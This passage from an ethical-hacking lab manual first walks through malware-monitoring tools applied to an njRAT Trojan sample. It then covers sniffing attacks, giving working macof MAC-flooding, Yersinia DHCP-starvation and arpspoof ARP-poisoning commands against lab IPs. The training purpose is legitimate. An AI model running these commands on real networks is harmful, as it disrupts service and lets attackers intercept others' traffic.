The Properties window appears, displaying information related to the process such as the name of the process, its process ID, Remote Address, Process Path, Remote Host Name, and other details.

Once you are done examining the properties associated with the process, click OK.

Screenshot

Because Trojan.exe is a malicious process, you may end the process by right-clicking on it and selecting Kill Processes Of Selected Ports from the context menu.

Alternatively, you may select Close Selected TCP Connections, so that the port closes, and the attacker can never regain connection through the port unless you open it.

Screenshot

Normally, when the CurrPorts dialog-box appears, you would click Yes to close the connection. However, do not Kill the process at this step, as this running process will be used for the next task; click No.

Screenshot

This way, you can analyze the ports open on a machine and the processes running on it.

If a process is found to be suspicious, you may either kill the process or close the port.

Close all open windows.

You can also use other port monitoring tools such as Port Monitor (https://www.port-monitor.com), TCP Port Monitoring (https://www.dotcom-monitor.com), or PortExpert (https://www.kcsoftwares.com) to perform port monitoring.

========
Task 2: Perform Process Monitoring using Process Monitor
========

Here, we will use the Process Monitor tool to detect suspicious processes.

On the Windows Server 2022 machine, navigate to Z:\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Process Monitoring Tools\ProcessMonitor and double-click Procmon.exe to launch the Process Monitor tool.

Screenshot

The Process Monitor License Agreement window appears; click Agree.

The Process Monitor main window appears, as shown in the screenshot, with the processes running on the machine.

Screenshot

Scroll-down to look for the Trojan.exe process that was executed in the previous task. If you killed the process at the end of the task, then navigate to Z:\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT and double-click Trojan.exe to re-execute the malicious program.

Observe that the Trojan.exe process is running on the machine. Process Monitor shows the running process details such as the PID, Operation, Path, Result, and Details.

Screenshot

To view the properties of a running process, select the process (here, Trojan.exe), right-click on the process and select Properties from the context menu.

Screenshot

The Event Properties window appears with the details of the chosen process.

In the Event tab, you can see the complete details of the running process such as Date, Thread, Class, Operation, Result, Path, and Duration.

Screenshot

Once the analysis is complete, click the Process tab.

The Process tab shows the complete details of the process running, as shown in the screenshot.

Screenshot

Click the Stack tab to view the supported DLLs of the selected process. Once the analysis is done, click Close.

Screenshot

This way, you can analyze the processes running on a machine.

If a process is found to be suspicious, you may either kill the process or close the port.

Close all windows on the Windows 11 and Windows Server 2022 machines.

You can also use other process monitoring tools such as Process Explorer (https://docs.microsoft.com), OpManager (https://www.manageengine.com), Monit (https://mmonit.com), or ESET SysInspector (https://www.eset.com) to perform process monitoring.

========
Task 3: Perform Registry Monitoring using Reg Organizer
========

Reg Organizer

Reg Organizer is designed to edit keys and parameters, as well as to delete the content of.reg files. It allows users to perform various operations with the system registry such as export, import and copy key values. It can also perform a deep searches to find even those keys associated with the application that cannot be found by other similar programs.

Here, we will use the registry monitoring tool Reg Organizer to scan the registry values for any changes.

Click Windows 11 to switch to the Windows 11 machine.

Navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Registry Monitoring Tools\Reg Organizer. double-click reg-organizer-setup.exe.

Screenshot

If Open File - Security Warning window appears, click Run.

If User Account Control window appears, click Yes.

Setup - Reg Organizer window appears, click Next.

Screenshot

Follow the wizard-driven installation steps to install the Reg Organizer.

After the completion of installation, Completing the Reg Organizer Setup Wizard appears, uncheck Enable functions requiring data transfer and What's new in this version checkboxes and click Finish.

Screenshot

Reg Organization main window appears, displaying System Cleanup, Startup Applications and Private Data Cleanup sections, as shown in the screenshot.

Screenshot

Now, click TOOLS from the menu bar and select Registry Snapshots option from the context menu.

Screenshot

Registry Snapshots Comparison window appears, click Create Snapshot option.

Screenshot

The process of taking a snapshot initializes and after it finishes, the Snapshot Created window appears; change the snapshot name to Shot 1 in the Enter the snapshot name field and click OK.

Screenshot

Shot 1 is created and appears in the middle pane, as shown in the screenshot.

Screenshot

To demonstrate a change in the registry, install any application (here, SoftPerfect Network Scanner). However, you can install any application of your choice to identify changes in the registry entries.

Navigate to E:\CEH-Tools\CEHv12 Module 04 Enumeration\SNMP Enumeration Tools\SoftPerfect Network Scanner and double-click netscan_setup.exe.

Screenshot

Follow the wizard-driven installation steps to install the SoftPerfect Network Scanner.

Once the installation is complete, uncheck the Launch SoftPerfect Network Scanner option and click Finish.

Screenshot

Now, click Compare with Current Registry option to compare the changes in the registry entries before and after installing SoftPerfect Network Scanner application.

Screenshot

Detecting changes… process initializes and after it completes Revealed Differences window appears, as shown in the screenshot.

Screenshot

You can examine the Registry entries from the left-pane. To do so, expand the nodes, select the entry you want to check and key files appear in the right-pane, as shown in the screenshot.

Screenshot

Screenshot

By examining modified registry entries in the result, you can find any unwanted registry entries on the machine and stop or delete them manually.

Close all open windows on the Windows 11 machine.

You can also use other registry monitoring tools such as regshot (https://sourceforge.net), Registry Viewer (https://accessdata.com), RegScanner (https://www.nirsoft.net), or Registrar Registry Manager (https://www.resplendence.com) to perform registry monitoring.

========
Task 4: Perform Windows Services Monitoring using Windows Service Manager (SrvMan)
========

Here, we will use the SrvMan tool to check for suspicious windows services.

On the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Windows Services Monitoring Tools\Windows Service Manager (SrvMan)\x64 and double-click srvman.exe.

You can choose any of the executable files for the Windows Service Manager according to your computer and OS design.

Screenshot

If a User Account Control window appears, click Yes.

The Service Manager main window appears, listing all services available or running on the machine, as shown in the screenshot.

Screenshot

The Service Manager shows the Internal name, State, Type, Display name, Start type, and Executable data of the services.

Here, you can choose any unwanted service that is running on your computer, and Stop or Delete that service by choosing the appropriate action.

You can view the properties of the selected service by clicking on Properties.

To Start a stopped service, click the Start service button. To stop a running service, click Stop service.

To restart any running service, click the Restart service button.

To add a new service to your machine, click the Add service button.

To delete any running or stopped service, click the Delete service button.

2022-04-06_15-33-31.jpg

Thus, you can monitor the unwanted services running on the machine using the Windows Service Manager.

Close the Service Manager window.

You can also use other Windows service monitoring tools such as Advanced Windows Service Manager (https://securityxploded.com), Process Hacker (https://processhacker.sourceforge.io), Netwrix Service Monitor (https://www.netwrix.com), or AnVir Task Manager (https://www.anvir.com) to perform Windows services monitoring.

========
Task 5: Perform Startup Program Monitoring using Autoruns for Windows and WinPatrol
========

WinPatrol WinPatrol provides the user with 14 different tabs to help in monitoring the system and its files. This security utility gives the user a chance to look for programs that are running in the background of a system so that the user can take a closer look and control the execution of legitimate and malicious programs.

In the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Windows Startup Programs Monitoring Tools\Autoruns for Windows and double-click Autoruns.exe.

The AutoRuns License Agreement window appears; click Agree.

Screenshot

The Autoruns main window appears. It displays all processes, dll’s, and services, as shown in the screenshot.

The application lists displayed under all the tabs may vary when you perform this task.

Screenshot

Click the Logon tab to view the applications that run automatically during login.

Screenshot

Click the Explorer tab to view the explorer applications that run automatically at system startup.

Screenshot

Clicking the Services tab displays all services that run automatically at system startup.

Screenshot

Click the Drivers tab to view all application drivers that run automatically at system startup.

Screenshot

You can click on any driver to display its size, version, and the time at which it was automatically run at system startup (for the first time).

The list displayed under this tab may vary when you perform this task.

Click the Known DLLs tab to view all known DLLs that start automatically at system startup.

Screenshot

By examining all these tabs, you can find any unwanted processes or applications running on the machine when the system boots up and stop or delete them manually.

Close the Autoruns main window.

Now, we will find out which applications or processes start when the system boots up using the WinPatrol tool.

On the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Windows Startup Programs Monitoring Tools\WinPatrol. Double-click wpsetup.exe to launch the setup.

If a User Account Control window appears, click Yes.

Follow the wizard-driven installation steps to install WinPatrol.

In the Installation completed wizard, make sure that the Start the application options is checked, and then click Finish. This will automatically launch the application.

Screenshot

The WinPartol application window appears with the PLUS tab open by default. Click the Startup Programs tab.

Select any program that affects your system bootup (here, OneDrive) and click Disable, as shown in the screenshot.

The screenshot may differ when you perform this task.

Screenshot

The OneDrive program will be deleted from the Startup Programs list. This is how to manage the Startup Programs for a Windows machine.

Now, switch to the IE Helpers tab. It shows all toolbars and links loaded by IE or other windows component. Select duplicate or non-required programs (here Java(tm) Plug-In SSV Helper), and then click Remove.

If a pop-up appears, as shown in the screenshot. Click Yes to proceed.

Screenshot

Switch to the Services tab to display the installed services on your system. Select any service and click Info…, as shown in the screenshot.

Screenshot

A window showing the service information appears. To disable a service, select Disabled from the drop-down list and click Apply, as shown in the screenshot. Click Close to exit the window.

Screenshot

Switch to the File Types tab to view the programs associated with a file. Select a program and click Info… to view the available information.

Screenshot

The Windows Batch File window appears, as shown in the screenshot. Click Expand Info to view the full info about the program.

Screenshot

The expanded view shows all information related to the program and its associated file, as demonstrated in the screenshot. Analyze the info and close the window.

Screenshot

Now, switch to the Active Tasks tab to view the current tasks running on your computer. Select any task and click Kill Task to end the task, as shown in the screenshot.

Screenshot

By examining all these tabs, you can find any unwanted process or application running on the machine when the system boots up and manually stop or delete them.

Close all open windows on the Windows 11 machine.

You can also use other Windows startup programs monitoring tools such as Autorun Organizer (https://www.chemtable.com), Quick Startup (https://www.glarysoft.com), or Chameleon Startup Manager (https://www.chameleon-managers.com) to perform startup programs monitoring.


========
Task 6: Perform Installation Monitoring using Mirekusoft Install Monitor
========

Here, we will use the Mirekusoft Install Monitor tool to detect hidden and background installations.

In the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Installation Monitoring Tools\Mirekusoft Install Monitor and double-click SetupInstallMonitor.exe.

If Update Available wizard appears, click Update button.

If a User Account Control window appears, click Yes.

Follow the installation steps to install Mirekusoft Install Monitor.

The Setup Successful wizard appears; click Launch.

Screenshot

If a User Account Control window appears, click Yes.

The Mirekusoft Install Monitor main window appears, along with a Welcome pop-up, click OK. Click Skip scan in the Home tab.

2022-04-06_16-11-00.jpg

Click the Programs tab to view the programs installed on your machine. You can choose any unwanted or unused application and click Uninstall to remove it from your machine. In this task, we are choosing the WinPatrol application.

The WinPatrol pop-up appears; click Reject Change.

2022-04-06_16-12-14.jpg

While uninstalling the application, a selected program pop-up appears, click Yes in all the WinPatrol pop-ups.

Screenshot

The selected application is uninstalled from your computer pop-up appears; click OK.

In the next WinPatrol pop-up, click Yes.

If a Cleanup for Selected Program window appears (here, WinPatrol), click OK.

Screenshot

A Cleanup for WinPatrol window appears, click OK.

Screenshot

The Confirm Cleanup WinPatrol pop-up appears; click Cleanup. This will delete all the supported files for the related application that you have uninstalled from your computer.

Screenshot

The selected application is uninstalled from your computer. Click the Performance tab to view and terminate currently running programs.

Here, you can select any program from the list and click End Program to terminate the program.

Click the Startup tab to view the programs that run automatically on Windows Startup.

In this task, Mirekusoft Install Monitor has not detected startup programs. If the program does detect them, choose the application that you want to disable on startup, and click Disable.

You can restart the machine to detect the startup programs.

Screenshot

This is how to monitor a Windows machine using Mirekusoft Install Monitor. Close all applications.

You can also use other installation monitoring tools such as SysAnalyzer (https://www.aldeid.com), Advanced Uninstaller PRO (https://www.advanceduninstaller.com), REVO UNINSTALLER PRO (https://www.revouninstaller.com), or Comodo Programs Manager (https://www.comodo.com) to perform installation monitoring.

========
Task 7: Perform Files and Folder Monitoring using PA File Sight
========

Features:

Compromised computers are blocked from reaching files on other protected servers on the network
Detects users copying files and optionally blocks access
Real-time alerts allow the appropriate staff to investigate immediately
Audits who is deleting, moving, and reading files
On the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Files and Folder Monitoring Tools\PA File Sight and double-click FileSight_Trial_Key_E71BE154-2386-4CF3-BEA3-75830C985736.exe.

If a Open File - Security Warning window appears, click Run. If a User Account Control window appears, click Yes.

The name of the exe file might differ when you perform the lab.

The Select Setup Language pop-up appears; choose your preferred language, and then click OK.

Follow the default installation steps to install PA File Sight.

Start Your Trial! window appears, ensure that Ultra radio button is selected and click Install Trial License.

Screenshot

A Success window appears, click OK.

Completing the PA File Sight Setup Wizard appears; make sure that both the Start the PA File Sight monitoring service and the Launch the PA File Sight Console options are checked, and click Finish.

This will run the PA File Sight service and automatically launch the application.

Screenshot

The PA File Sight Console window appears. By default, the Local host radio button is selected; click OK.

Screenshot

The PA File Sight Ultra Console main window appears.

If a Start Wizard window appears, close it.

Screenshot

Click Windows Server 2022 to switch to the Windows Server 2022 machine Click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator account is selected, click Pa$$w0rd to enter the password and press Enter.

Screenshot

Navigate to Z:\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Files and Folder Monitoring Tools\PA File Sight and double-click FileSight_Trial_Key_E71BE154-2386-4CF3-BEA3-75830C985736.exe.

If a Open File - Security Warning window appears, click Run.

The name of the exe file might differ when you perform the lab.

The Select Setup Language pop-up appears; choose your preferred language and click OK.

Click the Next button until you see the Select Components wizard.

In the Select Components wizard, uncheck the Central Monitoring Service and Console User Interface (configure all Services) options, and check the Satellite Monitoring Service (reports to the Central Monitoring Service) option; then, click Next.

Screenshot

Follow the wizard-driven installation steps to install the application.

In the final step of the installation, make sure that the Start the PA File Sight Satellite Monitoring Service and Configure the PA File Sight Satellite service options are checked; then, click Finish.

Screenshot

The Configure Satellite Monitoring Service window appears; type the Windows 11 IP address into the Central monitoring service address field along with port 8000. Leave the other settings to default and click Apply Settings.

In this task, the IP address of the Windows 11 machine is 10.10.1.11.

Screenshot

Click Stop Satellite Service to stop the satellite service.

2022-04-06_17-04-00.jpg

Once the service is stopped, click Start Satellite Service.

2022-04-06_17-04-44.jpg

Once the service has started, click Exit to close the application.

2022-04-06_17-05-56.jpg

Create a folder named File Monitoring on Desktop and open it. Create a new text document in the folder, name it Secret.txt, type some text content in the file, and save it. Close the notepad window.

Screenshot

Click Windows 11 to switch back to the Windows 11 machine, and observe that PA File Sight starts monitoring the Windows Server 2022 machine.

Screenshot

Expand the Server2022 node, select Inventory Collector in the left-hand pane, and click the Apply button from the right-hand pane.

2022-04-06_17-08-37.jpg

Now, right-click on Inventory Collector and click Run Now! from the context menu.

Screenshot

Select Server2022 in the left pane and scroll down in the right pane, and you can see the complete system information for the Windows Server 2022 machine on the dashboard.

Screenshot

Screenshot

Right-click on Server2022 and click the Add New Monitor option from the context menu.

Screenshot

The Add New Monitor window appears, select the File Sight Monitor icon, and then click OK.

Screenshot

The File Sight Configuration window appears; click the Browse button to provide a path for directory monitoring for the Server2022 machine (here, C:\Users\Administrator\Desktop\File Monitoring) and tick the Fire actions for each event separately checkbox.

Choose Audit file activity from the Monitor Purpose (for configuration help) drop-down list, and then click Actions.

2022-04-06_17-14-24.jpg

The Monitor Actions window appears; click New under Global Action List.

2022-04-06_17-16-54.jpg

The Add New Action window appears. Select the Action List icon and click OK.

Screenshot

The Action List window appears. Type a description in the Description field and click Add to choose actions.

2022-04-06_17-18-58.jpg

The Choose Action to Add window appears; choose any action from the list and click OK.

Screenshot

Click OK in the Action List window.

The Monitor Actions window appears; choose the newly created action (here, Monitoring File); and then click the << icon to add the action.

2022-04-06_17-20-31.jpg

Once the action is added to the Monitor Actions window, click OK.

Screenshot

In the File Sight Configuration window, click the File Activities tab and check the Existing file is written to and Ignore file appends (this is useful for monitoring log file integrity) options. Leave the other settings to default and click OK.

2022-04-06_17-21-46.jpg

Under the Server2022 node, Watch node will be added, select it and click Apply from the right-pane. Then right-click on the File Monitoring / Watch node and click Run Now! from the context menu.

2022-04-06_17-25-07.jpg

Click the Server2022 node to view the dashboard. Scroll down in the dashboard; observe that the File Monitoring directory is being monitored.

Screenshot

Click Windows Server 2022 to switch to the Windows Server 2022 machine Click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator account is selected, click Pa$$w0rd to enter the password and press Enter. Open Secret.txt in the File Directory on Desktop, modify some of the text in the file, and then Save and close the file.

Screenshot

Click Windows 11 to switch back to the Windows 11 machine and observe that PA File Sight has recorded some activity in the notepad file, as shown in the screenshot.

The software even shows the File Accessed/min in the graphical method, as shown in the screenshot.

Click on the notepad.exe link to view the activities done by the user.

2022-04-06_17-29-51.jpg

The CEH\Administrator notepad.exe window appears. If it shows a blank window, then click Windows Server 2022 to switch to the Windows Server 2022 machine, type some content into the Secret.txt file, save the file, and then immediately click Windows 11 to switch back to the Windows 11 machine to view the activity.

If you have added some text in the Secret.txt file, you can view that in the activity window.

Screenshot

Click Windows Server 2022 to switch back to the Windows Server 2022 machine and delete the Secret.txt file, then click Windows 11 to switch back to the Windows 11 machine. Wait for a while and an Alert from Windows11 pop-up appears, indicating an internal error, as shown in the screenshot.

2022-04-06_17-33-00.jpg

Now, scroll down to view the Recent Alerts section; in the Full History option, select 1 day link. You will find that the file has been deleted, as shown in the screenshot.

2022-04-06_17-34-14.jpg

This is how to monitor the file integrity using PA File Sight.

Close all open windows.

You can also use other file and folder integrity checking tools such as Tripwire File Integrity and Change Manager (https://www.tripwire.com), Netwrix Auditor (https://www.netwrix.com), Verisys (https://www.ionx.co.uk), or CSP File Integrity Checker (https://www.cspsecurity.com) to perform file and folder monitoring.

========
Task 8: Perform Device Driver Monitoring using DriverView and Driver Reviver
========

An ethical hacker and penetration tester must scan the system for suspicious device drivers and make sure that the systems runs smoothly by ensuring that all outdated drivers are updated and that the system processes optimized to keep the performance of the system at its peak.

On the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Device Drivers Monitoring Tools\DriverView and double-click DriverView.exe to launch the application.

Screenshot

The DriverView main window appears with a list of the installed drivers on your system, as shown in the screenshot.

Screenshot

Right-click on any driver from the list and click Properties to view the complete details of the driver.

Screenshot

The Properties window appears with the complete details of the installed driver, as shown in the screenshot. Once the analysis is done, click OK.

Screenshot

This is how to monitor the drivers installed on a machine. Close the DriverView window.

Now, we will see how to update system drivers and optimize the PC performance using Driver Reviver.

On Windows 11, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Device Drivers Monitoring Tools\Driver Reviver. Double-click DriverReviverSetup.exe to launch the setup.

If a User Account Control window appears, click Yes.

Driver Reviver Setup window appears, click Next to install the tool.

Screenshot

Installation window appears and after the completion of installation, Driver Reviver initializes the scan for drivers, as shown in the screenshot.

If a browser window opens automatically close the browser.

After the scan finishes, a list of system drivers are displayed.

Along with the list of drivers you can see their Status as OUTDATED or UP TO DATE.

Here, all the drivers are already up to date.

The result might vary when you perform this task.

Screenshot

If the drivers are outdated then you can click Update All button to update all the drivers.

Now, navigate to the Home tab, here you can view information such as System details, System, Processor, Graphics, Memory(RAM) and Hard Drives, as shown in the screenshot,

Screenshot

Navigate to the Backup tab, here you can create Backup or Restore the system drivers.

Screenshot

Uninstall the Driver Reviver software by navigating to Control Panel --> Programs --> Uninstall a program.

While uninstalling, remove all the files of tools from the system.

Close all open windows.

You can also use other device driver monitoring tools such as Driver Booster (https://www.iobit.com), Driver Easy (https://www.drivereasy.com), Driver Fusion (https://treexy.com), or Driver Genius 22 (https://www.driver-soft.com) to perform device driver monitoring.

========
Task 9: Perform DNS Monitoring using DNSQuerySniffer
========

DNSQuerySniffer is a network sniffer utility that shows the DNS queries sent on your system. For every DNS query, the following information is displayed: Host Name, Port Number, Query ID, Request Type (A, AAAA, NS, MX, and other types), Request Time, Response Time, Duration, Response Code, Number of records, and the content of the returned DNS records. You can easily export the DNS query information to a CSV, tab-delimited, XML, or HTML file, or copy the DNS queries to the clipboard and then paste them into Excel or another spreadsheet application.

Click Windows Server 2022 to switch to the Windows Server 2022 machine Click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator account is selected, click Pa$$w0rd to enter the password and press Enter.

Screenshot

Navigate to Z:\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\DNS Monitoring Tools\DNSQuerySniffer, and then double-click DNSQuerySniffer.exe.

Screenshot

The main window of DNSQuerySniffer appears, along with the Capture Options window.

If the Capture Options window does not appear, then navigate to the Options menu and select Capture Options.

In the Capture Options window, ensure that the WinPcap Packet Capture Driver option is selected under the Capture Method field.

In the Select network adapter section, select the Windows Server 2022 network adapter (here, Ethernet).

Click OK to start sniffing.

Screenshot

The DNSQuerySniffer starts monitoring the network traffic and takes some time to capture the traffic. Leave the window intact. It shows the DNS queries sent on your system along with its complete information such as host name, port number, request time, response time, duration, source address, and destination address, as shown in the screenshot.

It takes approximately 5 minutes to capture the traffic.

To view the Source Address and Destination Address columns, scroll to the right side of the window.

Screenshot

Screenshot

As you can see in the above screenshot, the DNS address is 8.8.8.8.

In real-time, attackers will use malicious applications like DNSChanger to change the DNS of the target machine. For demonstration purposes, we are changing the DNS of the Windows Server 2022 machine in the Network & Internet settings.

Right-click on the Network icon in the lower-right corner of Desktop and click Open Network & Internet settings.

Screenshot

The Network Status window appears. Click Change adapter options under Change your network settings.

Screenshot

Right-click on the network adapter (here, Ethernet) and click Properties.

Screenshot

The Adapter Properties window appears. Select Internet Protocol Version 4 (TCP/IPv4) and click Properties.

Screenshot

The Internet Protocol Version 4(TCP/IPv4) Properties window appears. Change the Preferred DNS server with the Windows 11 IP address and click OK. In this task, the Windows 11 IP address is 10.10.1.11.

Click OK, and then Close the Adapter Properties window.

Screenshot

Switch to the DNSQuerySniffer window; observe the few recorded logs for which DNS has changed.

Wait for approximately 5 minutes to capture the logs.

Screenshot

Right-click on the log for which DNS has changed and select Properties from the context menu.

Screenshot

In the Properties window, observe that there is a change in DNS. Click OK to close the window.

Screenshot

After completion of the task, go to the network settings, change DNS 8.8.8.8 in the Windows Server 2022 machine, and close all applications.

Screenshot

Close all open windows.

You can also use other DNS monitoring/resolution tools such as DNSstuff (https://www.dnsstuff.com), or Sonar Lite (https://constellix.com) to perform DNS monitoring.

########
Module 08 Sniffing
########

========
Lab 1 Perform Active Sniffing
========

========
Task 1: Perform MAC Flooding using macof
========

macof is a Unix and Linux tool that is a part of the dsniff collection. It floods the local network with random MAC addresses and IP addresses, causing some switches to fail and open in repeating mode, thereby facilitating sniffing. This tool floods the switch’s CAM tables (131,000 per minute) by sending forged MAC entries. When the MAC table fills up, the switch converts to a hub-like operation where an attacker can monitor the data being broadcast.

Here, we will use the macof tool to perform MAC flooding.

For demonstration purposes, we are using only one target machine (namely, Windows 11). However, you can use multiple machines connected to the same network. Macof will send the packets with random MAC addresses and IP addresses to all active machines in the local network.

Click Parrot Security to switch to the Parrot Security machine.

Screenshot

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine.

If a Parrot Updater pop-up appears at the top-right corner of Desktop, ignore and close it.

If a Question pop-up window appears asking you to update the machine, click No to close the window.

Screenshot

Click Applications in the top-left corner of Desktop and navigate to Pentesting --> Information Gathering --> wireshark.

Screenshot

A security pop-up appears, enter the password as toor in the Password field and click OK.

Screenshot

The Wireshark Network Analyzer window appears; double-click the available ethernet or interface (here, eth0) to start the packet capture, as shown in the screenshot.

Screenshot

Leave the Wireshark application running.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

The Parrot Terminal window appears; type macof -i eth0 -n 10 and press Enter.

-i: specifies the interface and -n: specifies the number of packets to be sent (here, 10).

You can also target a single system by issuing the command macof -i eth0 -d [Target IP Address] (-d: Specifies the destination IP address).

This command will start flooding the CAM table with random MAC addresses, as shown in the screenshot.

Screenshot

Switch to the Wireshark window and observe the IPv4 packets from random IP addresses, as shown in the screenshot.

Screenshot

Click on any captured IPv4 packet and expand the Ethernet II node in the packet details section. Information regarding the source and destination MAC addresses is displayed, as shown in the screenshot.

Screenshot

Similarly, you can switch to a different machine to see the same packets that were captured by Wireshark in the Parrot Security machine.

Macof sends the packets with random MAC and IP addresses to all active machines in the local network. If you are using multiple targets, you will observe the same packets on all target machines.

Close the Wireshark window. If an Unsaved packets… pop-up appears, click Stop and Quit without Saving to close the Wireshark application.

Screenshot

This concludes the demonstration of how to perform MAC flooding using macof.

Close all open windows and document all the acquired information.

========
Task 2: Perform a DHCP Starvation Attack using Yersinia
========

Yersinia is a network tool designed to take advantage of weaknesses in different network protocols such as DHCP. It pretends to be a solid framework for analyzing and testing the deployed networks and systems.

Here, we will use the Yersinia tool to perform a DHCP starvation attack on the target system.

On the Parrot Security machine; click Applications in the top-left corner of Desktop and navigate to Pentesting --> Information Gathering --> wireshark.

Screenshot

A security pop-up appears, enter the password as toor in the Password field and click OK.

Screenshot

The Wireshark Network Analyzer window appears; double-click the available ethernet or interface (here, eth0) to start the packet capture, as shown in the screenshot.

Screenshot

Leave the Wireshark application running.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Click the Maximize Window icon to maximize the terminal window.

The interactive mode of the Yersinia application only works in a maximized terminal window.

Screenshot

Type yersinia -I and press Enter to open Yersinia in interactive mode.

-I: Starts an interactive ncurses session.

Screenshot

Yersinia interactive mode appears in the terminal window.

Screenshot

To remove the Notification window, press any key, and then press h for help.

The Available commands option appears, as shown in the screenshot.

Screenshot

Press q to exit the help options.

Press F2 to select DHCP mode. In DHCP mode, STP Fields in the lower section of the window change to DHCP Fields, as shown in the screenshot.

Screenshot

Press x to list available attack options.

The Attack Panel window appears; press 1 to start a DHCP starvation attack.

Screenshot

Yersinia starts sending DHCP packets to the network adapter and all active machines in the local network, as shown in the screenshot.

If you are using multiple targets, you will observe the same packets on all target machines.

Screenshot

After a few seconds, press q to stop the attack and terminate Yersinia, as shown in the screenshot.

Screenshot

Now, switch to the Wireshark window and observe the huge number of captured DHCP packets, as shown in the screenshot.

Screenshot

Click on any DHCP packet and expand the Ethernet II node in the packet details section. Information regarding the source and destination MAC addresses is displayed, as shown in the screenshot.

Screenshot

Close the Wireshark window. If an Unsaved packets… pop-up appears, click Stop and Quit without Saving.

Screenshot

This concludes the demonstration of how to perform a DHCP starvation attack using Yersinia.

Close all open windows and document all the acquired information.


========
Task 3: Perform ARP Poisoning using arpspoof
========

arpspoof redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies. This is an extremely effective way of sniffing traffic on a switch.

Here, we will use the arpspoof tool to perform ARP poisoning.

In this lab, we will use the Parrot Security (10.10.1.13) machine as the host system and the Windows 11 (10.10.1.11) machine as the target system.

On the Parrot Security machine; click Applications in the top-left corner of Desktop and navigate to Pentesting --> Information Gathering --> wireshark.

Screenshot

A security pop-up appears, enter the password as toor in the Password field and click OK.

Screenshot

The Wireshark Network Analyzer window appears; double-click the available ethernet or interface (here, eth0) to start the packet capture, as shown in the screenshot.

Screenshot

Leave the Wireshark application running.

Now, click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the Parrot Terminal window, type arpspoof -i eth0 -t 10.10.1.1 10.10.1.11 and press Enter.

(Here, 10.10.1.11 is IP address of the target system [Windows 11], and 10.10.1.1 is IP address of the access point or gateway)

-i: specifies network interface and -t: specifies target IP address.

Issuing the above command informs the access point that the target system (10.10.1.11) has our MAC address (the MAC address of host machine (Parrot Security)). In other words, we are informing the access point that we are the target system.

After sending a few packets, press CTRL + z to stop sending the ARP packets.

Screenshot

Switch to the Wireshark window and you can observe the captured ARP packets, as shown in the screenshot.

Screenshot

Switch back to the terminal window where arpspoof was running. Type arpspoof -i eth0 -t 10.10.1.11 10.10.1.1 and press Enter.

Through the above command, the host system informs the target system (10.10.1.11) that it is the access point (10.10.1.1).

After sending a few packets, press CTRL + z to stop sending the ARP packets.

Screenshot

In Wireshark, you can observe the ARP packets with an alert warning “duplicate use of 10.10.1.11 detected!”

Click on any ARP packet and expand the Ethernet II node in the packet details section. As shown in the screenshot, you can observe the MAC addresses of IP addresses 10.10.1.1 and 10.10.1.11.

Here, the MAC address of the host system (Parrot Security) is 02:15:5d:22:14:ce.

Using arpspoof, we assigned the MAC address of the host system to the target system (Windows 11) and access point. Therefore, the alert warning of a duplicate use of 10.10.1.11 is displayed.

Screenshot

You can navigate to the Windows 11 machine and see the IP addresses and their corresponding MAC addresses. You will observe that the MAC addresses of IP addresses 10.10.1.1 and 10.10.1.13 are the same, indicating the occurrence of an ARP poisoning attack, where 10.10.11.13 is the Parrot Security machine and 10.10.1.1 is the access point.

Attackers use the arpspoof tool to obtain the ARP cache; then, the MAC address is replaced with that of an attacker’s system. Therefore, any traffic flowing from the victim to the gateway will be redirected to the attacker’s system.

This concludes the demonstration of how to perform ARP poisoning using arpspoof.

Close all open windows and document all the acquired information.

========
Task 4: Perform an Man-in-the-Middle (MITM) Attack using Cain & Abel
========

Cain & Abel is a password recovery tool that allows the recovery of passwords by sniffing the network and cracking encrypted passwords. The ARP poisoning feature of the Cain & Abel tool involves sending free spoofed ARPs to the network’s host victims. This spoofed ARP can make it easier to attack a middleman.

Here, we will use the Cain & Abel tool to perform an MITM attack.

Click Windows Server 2019 to switch to the Windows Server 2019 machine.

Click Ctrl+Alt+Delete to activate the machine. By default, Administrator user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows Server 2019 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

